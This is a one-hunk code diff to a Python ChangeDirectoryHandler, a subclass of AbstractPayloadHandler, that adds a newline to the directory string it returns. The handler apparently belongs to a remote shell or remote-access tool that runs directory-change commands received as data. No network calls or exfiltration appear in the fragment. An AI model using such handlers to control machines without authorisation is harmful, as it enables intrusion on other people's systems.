@@ -6,7 +6,7 @@ class ChangeDirectoryHandler(AbstractPayloadHandler):
         try:
             directory = data[3:].decode("utf-8")
             os.chdir(directory.strip())
-            return "/{}".format(os.getcwd())
+            return "/{}\n".format(os.getcwd())
         except Exception as e:
             return "Could not change directory: %s\n" %str(e)
 
